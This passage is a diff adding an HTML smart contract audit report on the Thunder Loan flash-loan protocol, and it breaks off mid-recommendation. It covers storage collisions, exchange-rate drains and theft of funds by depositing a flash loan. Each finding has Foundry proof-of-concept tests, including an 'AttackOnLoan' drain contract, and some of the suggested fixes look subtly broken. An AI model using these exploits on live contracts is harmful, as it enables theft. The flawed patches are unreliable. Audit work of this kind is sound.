@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2024-02-21-thunder-loan.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<div align="center">
+<p><img src="./logo.png" alt="Bellum Galaxy"></p>
+</div>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a></li>
+<li><a href="#protocol-summary">Protocol Summary</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#roles">Roles</a></li>
+<li><a href="#issues-found">Issues found</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#audit-findings">Audit Findings</a>
+<ul>
+<li><a href="#high-severity-vulnerabilities">High Severity Vulnerabilities</a></li>
+<li><a href="#medium-severity-vulnerabilities">Medium Severity Vulnerabilities</a></li>
+<li><a href="#minor-observations">Minor Observations</a></li>
+</ul>
+</li>
+<li><a href="#conclusion">Conclusion</a></li>
+<li><a href="#appendices">Appendices</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<p>We use the <a href="https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity">CodeHawks</a> severity matrix to determine severity. See the documentation for more details.</p>
+<h1 id="audit-details">Audit Details</h1>
+<ul>
+<li><strong>Project Name:</strong>
+<ul>
+<li>Thunder Loan</li>
+</ul>
+</li>
+<li><strong>Smart Contract Address:</strong>
+<ul>
+<li>Not deployed</li>
+</ul>
+</li>
+<li><strong>Audit Date:</strong>
+<ul>
+<li>22/02/2024</li>
+</ul>
+</li>
+<li><strong>Audit Tools Used:</strong>
+<ul>
+<li>Stateless Fuzz</li>
+<li>Stateful Fuzz</li>
+<li>Code Review</li>
+</ul>
+</li>
+<li><strong>Auditors:</strong>
+<ul>
+<li>Barba</li>
+</ul>
+</li>
+</ul>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<h2 id="scope">Scope</h2>
+<pre class="hljs"><code><div>#-- interfaces
+|   #-- IFlashLoanReceiver.sol
+|   #-- IPoolFactory.sol
+|   #-- ITSwapPool.sol
+|   #-- IThunderLoan.sol
+#-- protocol
+|   #-- AssetToken.sol
+|   #-- OracleUpgradeable.sol
+|   #-- ThunderLoan.sol
+#-- upgradedProtocol
+    #-- ThunderLoanUpgraded.sol
+</div></code></pre>
+<h2 id="roles">Roles</h2>
+<ul>
+<li>Owner: The owner of the protocol who has the power to upgrade the implementation.</li>
+<li>Liquidity Provider: A user who deposits assets into the protocol to earn interest.</li>
+<li>User: A user who takes out flash loans from the protocol.</li>
+</ul>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severtity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High</td>
+<td>4</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>2</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Info</td>
+<td>0</td>
+</tr>
+<tr>
+<td>Total</td>
+<td>7</td>
+</tr>
+</tbody>
+</table>
+<h2 id="audit-findings">Audit Findings</h2>
+<h3 id="high-severity-vulnerabilities">High Severity Vulnerabilities</h3>
+<ul>
+<li>
+<p><strong>Mixing up variable location causes storage collisions in <code>ThunderLoan::s_flashLoanFee</code> and <code>ThunderLoan::s_currentlyFlashLoaning</code></strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p><code>ThunderLoan.sol</code> has two variables in the following order:</p>
+<pre class="hljs"><code><div>    uint256 private s_feePrecision;
+    uint256 private s_flashLoanFee; <span class="hljs-comment">// 0.3% ETH fee</span>
+</div></code></pre>
+</li>
+<li>
+<p>However, the expected upgraded contract <code>ThunderLoanUpgraded.sol</code> has them in a different order.</p>
+<pre class="hljs"><code><div>    uint256 private s_flashLoanFee; <span class="hljs-comment">// 0.3% ETH fee</span>
+    uint256 public constant FEE_PRECISION = <span class="hljs-number">1e18</span>;
+</div></code></pre>
+</li>
+<li>
+<p>Due to how Solidity storage works, after the upgrade, the <code>s_flashLoanFee</code> will have the value of <code>s_feePrecision</code>. You cannot adjust the positions of storage variables when working with upgradeable contracts.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>After upgrade, the <code>s_flashLoanFee</code> will have the value of <code>s_feePrecision</code>. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the <code>s_currentlyFlashLoaning</code> mapping will start on the wrong storage slot.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>See the code below</summary>
+  Add the following code to the `ThunderLoanTest.t.sol` file. 
+<pre class="hljs"><code><div><span class="hljs-comment">// You'll need to import `ThunderLoanUpgraded` as well</span>
+<span class="hljs-keyword">import</span> { ThunderLoanUpgraded } <span class="hljs-keyword">from</span> <span class="hljs-string">"../../src/upgradedProtocol/ThunderLoanUpgraded.sol"</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testUpgradeBreaks</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        uint256 feeBeforeUpgrade = thunderLoan.getFee();
+        vm.startPrank(thunderLoan.owner());
+        ThunderLoanUpgraded upgraded = <span class="hljs-keyword">new</span> ThunderLoanUpgraded();
+        thunderLoan.upgradeTo(address(upgraded));
+        uint256 feeAfterUpgrade = thunderLoan.getFee();
+
+        assert(feeBeforeUpgrade != feeAfterUpgrade);
+    }
+</div></code></pre>
+  </details>
+<p>You can also see the storage layout difference by running <code>forge inspect ThunderLoan storage</code> and <code>forge inspect ThunderLoanUpgraded storage</code></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>
+<p>Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In <code>ThunderLoanUpgraded.sol</code>:</p>
+<details>
+<summary>See the </summary>
+<pre class="hljs"><code><div><span class="hljs-deletion">-    uint256 private s_flashLoanFee; // 0.3% ETH fee</span>
+<span class="hljs-deletion">-    uint256 public constant FEE_PRECISION = 1e18;</span>
+<span class="hljs-addition">+    uint256 private s_blank;</span>
+<span class="hljs-addition">+    uint256 private s_flashLoanFee; </span>
+<span class="hljs-addition">+    uint256 public constant FEE_PRECISION = 1e18;</span>
+</div></code></pre>
+</details>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Unnecessary <code>updateExchangeRate</code> in <code>deposit</code> function incorrectly updates <code>exchangeRate</code> preventing withdraws and unfairly changing reward distribution</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Asset tokens gain interest when people take out flash loans with the underlying tokens. In current version of ThunderLoan, exchange rate is also updated when user deposits underlying tokens.</li>
+<li>This does not match with documentation and will end up causing exchange rate to increase on deposit.</li>
+<li>This will allow anyone who deposits to immediately withdraw and get more tokens back than they deposited. Underlying of any asset token can be completely drained in this manner.</li>
+</ul>
+<details>
+<summary>See the code below</summary>
+<pre class="hljs"><code><div>    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        uint256 exchangeRate = assetToken.getExchangeRate();
+        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+        emit Deposit(msg.sender, token, amount);
+        assetToken.mint(msg.sender, mintAmount);
+        uint256 calculatedFee = getCalculatedFee(token, amount);
+        assetToken.updateExchangeRate(calculatedFee);
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Users can deposit and immediately withdraw more funds. Since exchange rate is increased on deposit, they will withdraw more funds then they deposited without any flash loans being taken at all.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the code below to `ThunderLoanTest.t.sol`</summary>
+<pre class="hljs"><code><div>function testExchangeRateUpdatedOnDeposit() public setAllowedToken {
+  tokenA.mint(liquidityProvider, AMOUNT);
+  tokenA.mint(user, AMOUNT);
+
+  // deposit some tokenA into ThunderLoan
+  vm.startPrank(liquidityProvider);
+  tokenA.approve(address(thunderLoan), AMOUNT);
+  thunderLoan.deposit(tokenA, AMOUNT);
+  vm.stopPrank();
+
+  // another user also makes a deposit
+  vm.startPrank(user);
+  tokenA.approve(address(thunderLoan), AMOUNT);
+  thunderLoan.deposit(tokenA, AMOUNT);
+  vm.stopPrank();        
+
+  AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+
+  // after a deposit, asset token's exchange rate has aleady increased
+  // this is only supposed to happen when users take flash loans with underlying
+  assertGt(assetToken.getExchangeRate(), 1 * assetToken.EXCHANGE_RATE_PRECISION());
+
+  // now liquidityProvider withdraws and gets more back because exchange
+  // rate is increased but no flash loans were taken out yet
+  // repeatedly doing this could drain all underlying for any asset token
+  vm.startPrank(liquidityProvider);
+  thunderLoan.redeem(tokenA, assetToken.balanceOf(liquidityProvider));
+  vm.stopPrank();
+
+  assertGt(tokenA.balanceOf(liquidityProvider), AMOUNT);
+}
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>It is recommended to not update exchange rate on deposits and updated it only when flash loans are taken, as per documentation.</li>
+</ul>
+<pre class="hljs"><code><div>    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+      AssetToken assetToken = s_tokenToAssetToken[token];
+      uint256 exchangeRate = assetToken.getExchangeRate();
+      uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+      emit Deposit(msg.sender, token, amount);
+      assetToken.mint(msg.sender, mintAmount);
+<span class="hljs-deletion">-   	uint256 calculatedFee = getCalculatedFee(token, amount);</span>
+<span class="hljs-deletion">-   	assetToken.updateExchangeRate(calculatedFee);</span>
+      token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>By calling a flashloan and then <code>ThunderLoan::deposit</code> instead of <code>ThunderLoan::repay</code> users can steal all funds from the protocol</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Once a flashloan is requested, the <code>ThunderLoan.sol</code> contract only verifies if the contract has the balance before the transaction end. So, a person can call the flashloan and deposit the value from the flashloan in the pool. The contract will verify that the balance is the same and will not revert. However, the user can withdraw the fake investment and steal the money.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Users can use the flashloan to steal the protocol money.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Add the code below to `ThunderLoanTest.t.sol` file</summary>
+<pre class="hljs"><code><div>    //Function
+    function testDepositFlashLoanExploit() public setAllowedToken hasDeposits {
+        uint256 amountToBorrow = 10 * 10e18;
+        uint256 amountToMint = 1 * 10e18;
+        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+
+        vm.startPrank(user);
+        attack = new AttackOnLoan(address(thunderLoan), address(tokenA));
+
+        tokenA.mint(address(attack), amountToMint);
+        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, &quot;&quot;);
+
+        vm.stopPrank();
+
+        attack.withdraw();
+
+
+        assertEq(attack.getBalanceDuring(), amountToBorrow + amountToMint); //110_000_000_000_000_000_000
+        assertEq(attack.getBalanceAfter(), amountToMint - calculatedFee); //9_700_000_000_000_000_000
+
+        uint256 stolenValue = tokenA.balanceOf(address(attack));
+        console.log(stolenValue); // 19_434_680_952_071_423_934
+    }
+
+    //Malicious Contract
+    contract AttackOnLoan {
+        error AttackOnLoan__onlyOwner();
+        error AttackOnLoan__onlyThunderLoan();
+
+        using SafeERC20 for IERC20;
+
+        address s_owner;
+        ThunderLoan s_thunderLoan;
+
+        uint256 s_balanceDuringFlashLoan;
+        uint256 s_balanceAfterFlashLoan;
+
+        IERC20 token;
+
+        constructor(address thunderLoan, address _token) {
+            s_owner = msg.sender;
+            token = IERC20(_token);
+            s_thunderLoan = ThunderLoan(thunderLoan);
+            s_balanceDuringFlashLoan = 0;
+        }
+
+        function executeOperation(
+            address _token,
+            uint256 amount,
+            uint256 fee,
+            address initiator,
+            bytes calldata /*  params */
+        )
+            external
+            returns (bool)
+        {
+            s_balanceDuringFlashLoan = IERC20(_token).balanceOf(address(this));
+            if (initiator != s_owner) {
+                revert AttackOnLoan__onlyOwner();
+            }
+            if (msg.sender != address(s_thunderLoan)) {
+                revert AttackOnLoan__onlyThunderLoan();
+            }
+
+            IERC20(_token).approve(address(s_thunderLoan), amount + fee);
+            s_thunderLoan.deposit(IERC20(_token), amount + fee);
+            s_balanceAfterFlashLoan = IERC20(_token).balanceOf(address(this));
+            return true;
+        }
+
+        function getBalanceDuring() external view returns (uint256) {
+            return s_balanceDuringFlashLoan;
+        }
+
+        function getBalanceAfter() external view returns (uint256) {
+            return s_balanceAfterFlashLoan;
+        }
+
+        function withdraw() public {
+            s_thunderLoan.redeem(token, token.balanceOf(address(this)));
+        }
+    }
+
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+  <details>
+  <summary>Adjust the code as follows</summary>
+<pre class="hljs"><code><div>
+<span class="hljs-addition">+   struct LoanControl{</span>
+<span class="hljs-addition">+       IERC20 token;</span>
+<span class="hljs-addition">+       uint256 amount;</span>
+<span class="hljs-addition">+       uint256 fee;</span>
+<span class="hljs-addition">+   }</span>
+
+<span class="hljs-addition">+   mapping(address user =&gt; LoanControl) private loanAmount;</span>
+    
+    function flashloan(
+        address receiverAddress,
+        IERC20 token,
+        uint256 amount,
+        bytes calldata params
+    )
+        external
+        revertIfZero(amount)
+        revertIfNotAllowedToken(token)
+    {
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
+
+        if (amount &gt; startingBalance) {
+            revert ThunderLoan__NotEnoughTokenBalance(startingBalance, amount);
+        }
+
+        if (receiverAddress.code.length == 0) {
+            revert ThunderLoan__CallerIsNotContract();
+        }
+
+        uint256 fee = getCalculatedFee(token, amount);
+        // slither-disable-next-line reentrancy-vulnerabilities-2 reentrancy-vulnerabilities-3
+        assetToken.updateExchangeRate(fee);
+
+<span class="hljs-addition">+       loanAmount[msg.sender] = LoanControl({</span>
+<span class="hljs-addition">+           token: token,</span>
+<span class="hljs-addition">+           amount: amount,</span>
+<span class="hljs-addition">+           fee: fee</span>
+<span class="hljs-addition">+       });</span>
+
+        emit FlashLoan(receiverAddress, token, amount, fee, params);
+
+        s_currentlyFlashLoaning[token] = true;
+
+        assetToken.transferUnderlyingTo(receiverAddress, amount);
+        // slither-disable-next-line unused-return reentrancy-vulnerabilities-2
+        receiverAddress.functionCall(
+            abi.encodeCall(
+                IFlashLoanReceiver.executeOperation,
+                (
+                    address(token),
+                    amount,
+                    fee,
+                    msg.sender, // initiator
+                    params
+                )
+            )
+        );
+
+        
+<span class="hljs-deletion">-       uint256 endingBalance = token.balanceOf(address(assetToken));</span>
+<span class="hljs-deletion">-       if (endingBalance &lt; startingBalance + fee) {</span>
+<span class="hljs-addition">+       if (loanAmount[msg.sender].amount &gt;= 1) {</span>
+<span class="hljs-deletion">-           revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);</span>
+<span class="hljs-addition">+           revert ThunderLoan__NotPaidBack(startingBalance + fee, loanAmount[msg.sender].amount);</span>
+        }
+        s_currentlyFlashLoaning[token] = false;
+    }
+
+    function repay(IERC20 token, uint256 amount) public {
+        if (!s_currentlyFlashLoaning[token]) {
+            revert ThunderLoan__NotCurrentlyFlashLoaning();
+        }
+
+<span class="hljs-addition">+       loanAmount[msg.sender].amount = loanAmount[msg.sender].amount - (amount - loanAmount[msg.sender].fee);</span>
+
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+
+</div></code></pre>
+  </details>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>fee are less for non standard ERC20 Token</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>Within the functions <code>ThunderLoan::getCalculatedFee()</code> and <code>ThunderLoanUpgraded::getCalculatedFee()</code>, an issue arises with the calculated fee value when dealing with non-standard ERC20 tokens. Specifically, the calculated value for non-standard tokens appears significantly lower compared to that of standard ERC20 tokens.</p>
+<details>
+<summary>`ThunderLoan.sol`</summary>
+<pre class="hljs"><code><div>    function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+@&gt;        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+    }
+</div></code></pre>
+<pre class="hljs"><code><div>//ThunderLoanUpgraded.sol
+
+function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+@&gt;        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / FEE_PRECISION;
+@&gt;        fee = (valueOfBorrowedToken * s_flashLoanFee) / FEE_PRECISION;
+    }
+</div></code></pre>
+</details>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>
+<p>Let's say:</p>
+</li>
+<li>
+<p>user_1 asks a flashloan for 1 ETH.</p>
+</li>
+<li>
+<p>user_2 asks a flashloan for 2000 USDT.</p>
+<details>
+<summary>See the code below </summary>
+<pre class="hljs"><code><div>function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+        
+        //1 ETH = 1e18 WEI
+        //2000 USDT = 2 * 1e9 WEI
+
+        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+
+        // valueOfBorrowedToken ETH = 1e18 * 1e18 / 1e18 WEI
+        // valueOfBorrowedToken USDT= 2 * 1e9 * 1e18 / 1e18 WEI
+
+        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+
+        //fee ETH = 1e18 * 3e15 / 1e18 = 3e15 WEI = 0,003 ETH
+        //fee USDT: 2 * 1e9 * 3e15 / 1e18 = 6e6 WEI = 0,000000000006 ETH
+    }
+</div></code></pre>
+</details>
+<p>The fee for the user_2 are much lower then user_1 despite they asks a flashloan for the same value (hypotesis 1 ETH = 2000 USDT).</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Adjust the precision accordinly with the allowed tokens considering that the non standard ERC20 haven't 18 decimals.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="medium-severity-vulnerabilities">Medium Severity Vulnerabilities</h3>
+<ul>
+<li>
+<p><strong>Centralization risk for trusted owners</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.</p>
+<pre class="hljs"><code><div>    File: src/protocol/ThunderLoan.sol
+
+    223:     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+
+    261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ol>
+<li>A malicious user can take control over the protocol and blacklist tokens blocking withdraws.</li>
+<li>An arbitrary new implementation can change critical protocol functions leading to exploits.</li>
+</ol>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li>Call <code>ThunderLoan.sol::setAllowedToken</code> inputing allowed as false.</li>
+<li>The stablecoin will be deleted.</li>
+<li>User can't withdraw anymore.</li>
+</ol>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ol>
+<li>Implement the code bellow.</li>
+</ol>
+  <details>
+  <summary>Create a new mapping and Adjust the code of `ThunderLoan.sol::setAllowedToken` as follows</summary>
+<pre class="hljs"><code><div><span class="hljs-addition">+   mapping(IERC20 token =&gt; bool allowed) private isAllowedForDeposits;</span>
+
+    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+        if (allowed) {
+            if (address(s_tokenToAssetToken[token]) != address(0)) {
+                revert ThunderLoan__AlreadyAllowed();
+            }
+            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
+            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
+            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
+            s_tokenToAssetToken[token] = assetToken;
+            emit AllowedTokenSet(token, assetToken, allowed);
+            return assetToken;
+        } else {
+<span class="hljs-addition">+           if(token.balanceOf(address(this)) &lt; 1){</span>
+              AssetToken assetToken = s_tokenToAssetToken[token];
+              delete s_tokenToAssetToken[token];
+              emit AllowedTokenSet(token, assetToken, allowed);
+              return assetToken;
+<span class="hljs-addition">+           } else {</span>
+<span class="hljs-addition">+               isAllowedForDeposits[token] = allowed;</span>
+<span class="hljs-addition">+               emit AllowedTokenSet(token, assetToken, allowed);</span>
+<span class="hljs-addition">+               return assetToken;</span>
